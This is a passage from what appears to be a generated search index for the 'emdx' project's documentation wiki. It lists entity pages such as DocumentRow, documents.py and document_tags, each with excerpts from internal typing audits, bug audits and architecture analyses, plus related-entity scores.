Section: UNNECESSARY <code>| None</code> Annotations</p> </li> </ul> <pre><code>def __init__(self, db_path: Union[str, Path] | None = None):\n</code></pre> <p>Assessment: NECESSARY \u2014 same pattern, optional override.</p>"},{"location":"entities/documentmergerpy/#phase-1-foundation","title":"Phase 1: Foundation \u2713","text":""},{"location":"entities/documentmergerpy/#4-extract-document-scoring","title":"4. Extract Document Scoring","text":"<p>Location: Can stay in <code>document_merger.py</code> or extract to <code>emdx/utils/document_scoring.py</code></p>"},{"location":"entities/documentmergerpy/#4-document_mergerpy58-documentmerger__init__","title":"4. <code>document_merger.py:58</code> \u2014 <code>DocumentMerger.__init__</code>","text":""},{"location":"entities/documentmergerpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.6)</li> <li><code>find_all_duplicate_pairs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>register command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>implementation tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>hybrid_search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>group_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/documentrow/","title":"documentrow","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-15</p>"},{"location":"entities/documentrow/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6823 Delegate: Document #6822 (Wiki System Architecture Analysis &amp; Roadmap) [1/2]   Section: Summary</p> <p><code>DocumentRow</code> TypedDict \u2014 added <code>doc_type: str</code> field</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: All 45 TypedDicts (by location)</p> <p>...| | <code>DocumentGroup</code> | no | | <code>GroupMember</code> | no | | <code>DocumentWithGroups</code> | no | | <code>DocumentRow</code> | no | | <code>DocumentListItem</code> | no | | <code>RecentDocumentItem</code> | no | | <code>DeletedDocumentItem</code> | no | | <code>ChildDocumentItem</code> | no | | <code>SupersedeCandidate</code> | no | | `Search...</p> </li> <li> <p>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: 1. emdx/commands/ (11 files audited)</p> <p>Quick Wins:</p> </li> <li><code>cascade._process_stage()</code>: Use existing <code>DocumentRow</code></li> <li><code>groups._add_group_to_tree()</code>: Use existing <code>DocumentGroup</code></li> <li> <p><code>recipe._find_recipe()</code>: Use existing <code>DocumentRow</code></p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: cascade/cascade_browser.py</p> <p>...-------------| | <code>doc</code> variable | L68 | <code>dict[str, Any] \\| None</code> | \u2705 Yes | <code>CascadeDocumentRow \\| None</code> | | <code>_start_completion_monitor.doc</code> | L120 | <code>dict[str, Any]</code> | \u2705 Yes | <code>CascadeDocumentRow</code> |</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: cascade.py</p> Function Signature Replaceable? Suggested Type <code>_process_stage</code> <code>doc: dict[str, Any]</code> \u2705 Yes <code>DocumentRow</code> from database/types.py </li> <li> <p>#6434 Any/None typing audit [4/5]   Section: cascade_service.py</p> <p>...rams <code>doc: dict</code>, <code>next_stage_map: dict</code>, <code>save_doc: Callable</code> | \u26a0\ufe0f Partial | Use <code>DocumentRow</code> TypedDict, <code>dict[str, str]</code>, <code>Callable[[...], int]</code> |</p> </li> <li> <p>#6431 Add cascade TypedDicts to database and service layers   Section: Changes Made</p> <p>...- Pipeline activity record</p> </li> <li><code>ChildDocInfo</code> - Basic info about a child document</li> <li> <p><code>DocumentRow</code> - Full document row with cascade fields</p> </li> <li> <p>#6427 Add DocumentRow TypedDicts to database layer   Section: Add DocumentRow TypedDicts to database layer</p> </li> <li><code>DocumentRow</code> - Full document row from documents table</li> <li><code>DocumentListItem</code> - Items returned by list_documents  </li> <li> <p><code>RecentDocumentItem</code> - Items returned by get_recent_documents -...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Common Themes</p> <ol> <li>DocumentRow is foundational \u2014 Many cascade and group queries join against documents. Defining <code>DocumentRow</code> first enables composition in other types.</li> </ol> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: emdx/services/unified_search.py</p> <p>...ype**: <code>list[tuple[float, dict[str, Any]]]</code></p> </li> <li>Actual Type: Create a TypedDict <code>DocumentRow</code> with fields: <code>id: int, title: str, project: str | None, created_at: str | None, updated_at: str | None</code></li> <li>Rationale: Represents a database row with known schema...</li> </ul>"},{"location":"entities/documentrow/#typeddicts-defined","title":"TypedDicts Defined","text":""},{"location":"entities/documentrow/#related-entities","title":"Related Entities","text":"<ul> <li><code>duplicatestats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>supersedecandidate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>recentdocumentitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>mostvieweddoc</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>environmentinfo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>duplicatedocument</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>documentlistitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>deleteddocumentitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>contentitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>childdocumentitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/documents/","title":"documents","text":"<p>Type: tech_term | Mentioned in: 17 documents | First seen: 2026-02-13</p>"},{"location":"entities/documents/#documents-17","title":"Documents (17)","text":"<ul> <li>#6823 Delegate: Document #6822 (Wiki System Architecture Analysis &amp; Roadmap) [1/2]   Section: Summary <p>..._046_add_doc_type`):</p> </li> <li>Adds <code>doc_type TEXT NOT NULL DEFAULT 'user'</code> column to the <code>documents</code> table</li> <li>Creates index <code>idx_documents_doc_type</code> for efficient filtering</li> <li> <p>Backfills existing docs tagged <code>wiki-article</code> to <code>doc_type='wiki'</code></p> </li> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Current State Analysis</p> <p>Corpus: 687 non-deleted documents, 36,643 entity rows, 24,074 unique entities.</p> </li> <li> <p>#6716 Wiki Generation Architecture Research [8/10]   Section: Wiki Generation Schema Design</p> <p>Core approach: Hybrid self-hosting \u2014 Wiki articles are saved as regular <code>documents</code> (gaining FTS5, search, links, embeddings, tags for free), while generation metadata lives in dedicated tables. This follows the <code>maintain compact</code> precedent.</p> </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Progressive disclosure:</p> <p>...neration Plan:   Topics: 12 articles to generate (4 new, 8 updated)   Sources: 847 documents   Est. cost: ~$0.45 (180K tokens in, 48K out)   Model: claude-sonnet-4-5</p> </li> <li> <p>#6713 wiki-schema-research   Section: Current Schema Inventory (Relevant Tables)</p> Table Purpose Key Columns <code>documents</code> Core content store id, title, content, project, parent_id, relationship, stage <code>documents_fts</code> FTS5 full-text search title, content, project `docume... </li> <li> <p>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: How This Compares to the Activity Screen</p> <p>...---|------------|-----------------| | Data source | <code>tasks</code> table (manual only) | <code>documents</code> + <code>agent_executions</code> tables | | Grouping | By status (open/active/blocked/done/failed) | Flat chronological, running pinned to top | | Auto-refresh | No (manual <code>r</code>...</p> </li> <li> <p>#6411 Delegate: Implement 'emdx briefing' command. This is a new command tha   Section: Summary</p> <p>Implemented the <code>emdx briefing</code> command that synthesizes recent emdx activity into a human-readable summary. This provides a quick overview of what happened across tasks, documents, and delegate executions since a configurable cutoff time.</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 30 Migrations(!!) Creating Tables:</p> <p>CORE TABLES (Essential)</p> </li> <li><code>documents</code> - Main content store with FTS5</li> <li><code>documents_fts</code> - Full-text search</li> <li><code>tags</code>, <code>document_tags</code> - Tagging system</li> <li><code>executions</code> - Claude execution tracking</li> <li> <p><code>tasks</code>,...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...se/`)</p> </li> <li><code>connection.py</code>: SQLite context manager with foreign keys enabled</li> <li><code>documents.py</code>: CRUD with access tracking (<code>track_access</code> flag prevents count inflation)</li> <li><code>search.py</code>: FTS5 full-text search with ranking</li> <li> <p><code>cascade.py</code>: cascade pip...</p> </li> <li> <p>#6283 Delegate synthesis [synthesis]   Section: 3. Database Migration Debt Fixed (PR #512)</p> <ul> <li>11 foreign keys changed from <code>ON DELETE NO ACTION</code> \u2192 <code>ON DELETE SET NULL</code></li> </ul> </li> <li>Added <code>LOWER(title)</code> indexes on <code>documents</code> and <code>tasks</code> tables</li> <li> <p>Preserves execution/task history when related records deleted</p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: Executive Summary</p> <p>EMDX has four primary tracking systems that significantly overlap:</p> </li> <li>Documents with Tags (status tags like \ud83d\ude80active, \u2705done, \ud83d\udea7blocked)</li> <li>Tasks (separate table with status, dependencies, gameplan_id)</li> <li> <p>Cascade (document stages: idea \u2192...</p> </li> <li> <p>#6159 Delegate: Remove dead code from emdx/database/documents.py and emdx/se [1/2]   Section: Dead Code Removal from emdx/database/documents.py and emdx/services/document_service.py</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Architecture</p> <p>...# Business logic (executors, embedding, etc.) \u251c\u2500\u2500 models/        # Data models (documents, tags, tasks) \u251c\u2500\u2500 config/        # Settings, constants, CLI config \u251c\u2500\u2500 utils/         # Git ops, emoji aliases, formatting \u2514\u2500\u2500 prompts/       # Prompt templates ```</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Project Structure</p> <p>...y     # Tag management \u2502   \u2514\u2500\u2500 ... \u251c\u2500\u2500 database/       # SQLite operations \u2502   \u251c\u2500\u2500 documents.py # Document CRUD \u2502   \u251c\u2500\u2500 search.py    # FTS5 search \u2502   \u251c\u2500\u2500 cascade.py   # Cascade metadata \u2502   \u2514\u2500\u2500 connection.py \u251c\u2500\u2500 services/       # Business logic layer \u2502   \u251c\u2500...</p> </li> <li> <p>#6710 Delegate: Design a unified dashboard data model. Given that we want to [4/4]   Section: The Core Insight: <code>ActivityItem</code> IS the Dashboard Item</p> <p>...l properties <code>item_type</code>, <code>type_icon</code>, <code>status_icon</code>, and <code>get_preview_content()</code>. Documents and executions are already subclasses. The fix is simply adding <code>TaskItem(ActivityItem)</code> as a third subclass \u2014 no new base class needed.</p> </li> <li> <p>#6706 Delegate: Analyze the current Activity screen (emdx/ui/activity/) in d [1/4]   Section: What It Shows</p> <p>...40% width), split into:</p> </li> <li>Activity table (70%) \u2014 flat <code>DataTable</code> of recent documents + agent executions, sorted by time (running pinned to top). Columns: status icon, title, relative time, ID</li> <li> <p>Context panel (30%) \u2014 document metadata: project,...</p> </li> <li> <p>#6591 Delegate: Research what an 'emdx init' command should do for first-run [2/4]   Section: Mental Model</p> <p>emdx stores documents \u2014 any text you want to keep. Every document is:</p> </li> <li>Searchable via full-text search</li> <li>Taggable for organization  </li> <li>Viewable by ID</li> </ul>"},{"location":"entities/documents/#summary","title":"Summary","text":"<p>Removed dead code related to deprecated document source and cascade functions from documents.py.</p>"},{"location":"entities/documents/#related-entities","title":"Related Entities","text":"<ul> <li><code>documents_fts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>wiki-article</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>status bar</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>optional dependencies heavy</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>safe mode</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>emdx_safe_mode=1</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>document_groups</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>what it shows</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>pr creation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>document_cascade_metadata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/documentspy/","title":"documents.py","text":"<p>Type: heading | Mentioned in: 16 documents | First seen: 2026-02-13</p>"},{"location":"entities/documentspy/#documents-16","title":"Documents (16)","text":"<ul> <li> <p>#6432 Any/None typing audit [1/5]   Section: cascade.py</p> <p>...record: dict[str, Any]<code>param, returns</code>dict[str, Any]<code>| **No** | Same pattern as documents.py helper | |</code>get_oldest_at_stage<code>|</code>raw: dict[str, Any]` local | No | Pre-cast intermediate dict |</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: 1. GLOBAL STATE: Database Singleton</p> <p>Instances:</p> </li> <li><code>database/documents.py:9</code> \u2014 imports <code>db_connection</code></li> <li><code>database/search.py:9</code> \u2014 imports <code>db_connection</code></li> <li><code>database/cascade.py:17</code> \u2014 imports <code>db_connection</code></li> <li> <p><code>models/executions.py:9</code> \u2014 imp...</p> </li> <li> <p>#6437 Any/None typing audit [synthesis]   Section: Actionable Items</p> <p>...<code>| |</code>tasks.py<code>(3 locations) |</code>params: list[Any]<code>| Use</code>list[str | int]<code>| |</code>documents.py<code>,</code>search.py<code>,</code>cascade.py<code>|</code>params: list[Any]<code>| Use</code>list[str | int]<code>or</code>SqlParams` alias |</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: Files with NO Any usage</p> <ul> <li><code>documents.py</code> - Re-exports only, no function definitions</li> </ul> </li> <li><code>categories.py</code> - Uses only concrete types and cast()</li> <li><code>types.py</code> - TypedDict definitions only</li> <li> <p><code>__init__.py</code> - Re-exports only</p> </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]   Section: Summary</p> <p>...th <code>Any</code> returns | Priority | |------|------------------------------|----------| | documents.py | 12 functions | High | | cascade.py | 7 functions | High | | groups.py | 8 functions | Medium | | search.py | 1 function | Medium | | init.py (SQLiteDatabase) |...</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Review Summary</p> <p>...hecks - \u2705 GOOD All 10 locations properly check for None before accessing index:</p> </li> <li><code>documents.py</code>: count_documents(), get_stats()</li> <li><code>groups.py</code>: get_recursive_doc_count(), _update_group_metrics()</li> <li><code>executions.py</code>: get_execution_stats() (2 locations)</li> <li> <p><code>tags.py</code>...</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...mic Transaction for save_document()</p> </li> <li>Modified <code>save_document()</code> in <code>emdx/database/documents.py</code> to pass existing connection to <code>add_tags_to_document()</code></li> <li>Document + tags now inserted in single atomic transaction</li> <li> <p>Moved <code>conn.commit()</code> after tagging to ensure...</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 1. Transaction Isolation Failures (Multiple Locations)</p> <p>...6` \u2014 Connection closed without rollback on exception; partial writes may commit</p> </li> <li><code>documents.py:24-49</code> \u2014 Commits after INSERT, then calls <code>add_tags_to_document()</code> in separate transaction</li> <li> <p><code>cascade.py:257-308</code> \u2014 Opens two separate connections for related operat...</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 1: <code>models/</code> Directory Naming (PARTIALLY ADDRESSED)</p> <p>Current State: The <code>models/</code> directory now re-exports from <code>database/</code>:</p> </li> <li><code>models/documents.py</code> - Re-exports from <code>emdx.database.documents</code> with deprecation note</li> <li> <p><code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/tags.py</code> - Need inspection</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 1. SQL Query Duplication</p> <p>...ples of duplicated SQL:**</p> </li> <li><code>save_document</code>: lines 88-114 duplicate lines 32-49 in documents.py</li> <li><code>get_document</code>: lines 122-146 duplicate lines 52-101 in documents.py  </li> <li><code>delete_document</code>: lines 187-214 duplicate lines 269-313 in documents.py</li> <li> <p>`search_documen...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...se/`)</p> </li> <li><code>connection.py</code>: SQLite context manager with foreign keys enabled</li> <li><code>documents.py</code>: CRUD with access tracking (<code>track_access</code> flag prevents count inflation)</li> <li><code>search.py</code>: FTS5 full-text search with ranking</li> <li> <p><code>cascade.py</code>: cascade pipeli...</p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: 5. INFO: Good Practices Observed**</p> <p>...hat wraps terms in quotes</p> </li> <li> <p>All user data uses parameterized queries: Checked <code>documents.py</code>, <code>search.py</code>, <code>groups.py</code></p> </li> <li> <p>#6157 Delegate: Check if the legacy cascade wrapper functions in emdx/databa [2/5]   Section: Legacy Cascade Wrapper Functions Usage Analysis</p> </li> <li><code>get_oldest_at_stage</code></li> <li><code>update_document_stage</code></li> <li><code>update_document_pr_url</code></li> <li><code>get_document_pr_url</code></li> <li><code>list_documents_at_stage</code></li> <li><code>count_documents_at_stage</code></li> <li> <p>`get...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> </li> <li>documents.py: All necessary (nullable columns, optional filters)</li> <li>init.py: All necessary (passthrough params)</li> <li>groups.py: All necessary</li> <li> <p>cascade.py: All nece...</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 5. list_non_workflow_documents \u2014 DEAD CODE (4 hits)</p> <p>File: <code>emdx/database/documents.py</code></p> </li> </ul>"},{"location":"entities/documentspy/#functions-analyzed-from-emdxdatabasedocumentspy","title":"Functions Analyzed (from emdx/database/documents.py)","text":""},{"location":"entities/documentspy/#database-module","title":"Database Module","text":""},{"location":"entities/documentspy/#emdx-models-bug-audit-report","title":"EMDX Models Bug Audit Report","text":"<p>Date: 2026-02-15 Scope: emdx/models/ directory (documents.py, tags.py, tasks.py, categories.py, executions.py)</p>"},{"location":"entities/documentspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.7)</li> <li><code>_parse_cascade_datetimes()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>connection.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>emdx/database/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>any type annotation audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>_parse_doc_datetimes()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>raw: dict[str, any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>database layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>allowed_execution_columns</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>action required</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> </ul>"},{"location":"entities/documenttags/","title":"document_tags","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-01-14</p>"},{"location":"entities/documenttags/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6713 wiki-schema-research   Section: Current Schema Inventory (Relevant Tables)</p> <p>...embeddings | document_id, chunk_index, heading_path, text, embedding | | <code>tags</code> / <code>document_tags</code> | Tag system | name, document_id | | <code>tasks</code> | Task management | title, status, epic_key, type |</p> </li> <li> <p>#6611 Emoji alias removal: synthesis   Section: Database Migration is Mandatory</p> <p>Existing databases store emoji characters in <code>tags.name</code>. A migration must:</p> </li> <li>Map each stored emoji back to its canonical text name</li> <li>Handle merge conflicts where both emoji and text versions exist</li> <li> <p>Preserve <code>document_tags</code> foreign key integrity</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: 2. <code>emdx/models/tags.py</code> \u2014 MAJOR CHANGES**</p> <p>...ded_tags = expand_aliases(tag_names)<code>| Remove \u2014 use</code>tag_names<code>directly | |</code>get_document_tags()<code>(line 138) |</code>normalize_tag_to_emoji(tag)<code>on each retrieved tag, then deduplicates | Remove normalization \u2014 just return raw tags | |</code>get_tags_for_documents()` (...</p> </li> <li> <p>#6525 Delegate: FEAT-7 Ask-KB Improvements Implementation   Section: Phase 1: Core Filters</p> <ol> <li>Created <code>_get_filtered_doc_ids()</code> helper in <code>AskService</code></li> </ol> </li> <li>Joins <code>document_tags</code> and <code>tags</code> tables</li> <li>Uses <code>normalize_tag_to_emoji()</code> for alias resolution</li> <li> <p>Filters by <code>created_at &gt; datetime('now', '-N days')</code> for recency</p> </li> <li> <p>#6523 Gameplan: FEAT-7 Ask-KB Improvements   Section: Phase 1: Core Filters (HIGH priority)</p> <p>..., recent_days)<code>helper in</code>emdx/services/ask_service.py`</p> </li> <li>Filter docs by joining <code>document_tags</code> table</li> <li> <p>Use <code>normalize_tag_to_emoji()</code> from <code>emdx/utils/emoji_aliases.py</code> for alias resolution</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: 1. <code>--tags</code> Filter \u274c MISSING**</p> <p>...)` commands</p> </li> <li>Create <code>_add_filters()</code> helper in <code>ask_service.py</code></li> <li>Integrate with <code>document_tags</code> and <code>tags</code> tables</li> <li> <p>Use <code>normalize_tag_to_emoji()</code> for alias resolution</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Current State Analysis</p> <p>Existing related tables:</p> </li> <li><code>tags</code> / <code>document_tags</code> (many-to-many tag system)</li> <li><code>executions</code> (tracks Claude executions)</li> <li> <p><code>gists</code> (GitHub gist exports)</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 30 Migrations(!!) Creating Tables:</p> <p>...ts` - Main content store with FTS5</p> </li> <li><code>documents_fts</code> - Full-text search</li> <li><code>tags</code>, <code>document_tags</code> - Tagging system</li> <li><code>executions</code> - Claude execution tracking</li> <li><code>tasks</code>, <code>task_deps</code>, <code>task_log</code> - Work queue</li> <li> <p><code>gists</code> - GitHub gist tracking</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...ments` - content, metadata, project association, parent_id for lineage</p> </li> <li><code>tags</code> / <code>document_tags</code> - emoji tags with aliases</li> <li><code>executions</code> - execution tracking with PID, log file, status</li> <li><code>documents_fts</code> - FTS5 virtual table</li> <li> <p><code>cascade_runs</code> - pipeline executio...</p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: 1. Documents with Tags</p> <p>Data Model:</p> </li> <li><code>documents</code> table: id, title, content, project, parent_id, relationship, archived_at</li> <li><code>document_tags</code> junction table linking documents to tags</li> <li> <p><code>tags</code> table with usage_count</p> </li> <li> <p>#4848 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: 4. Dual Indexing Enables Bidirectional Performance**</p> <p><code>sql CREATE INDEX idx_document_tags_tag_id ON document_tags(tag_id); CREATE INDEX idx_document_tags_document_id ON document_tags(document_id);</code></p> </li> </ul>"},{"location":"entities/documenttags/#related-entities","title":"Related Entities","text":"<ul> <li><code>enhanced output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>core filters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>ask()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>tags.name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>on delete cascade</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>migration_029_convert_emoji_tags_to_text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> 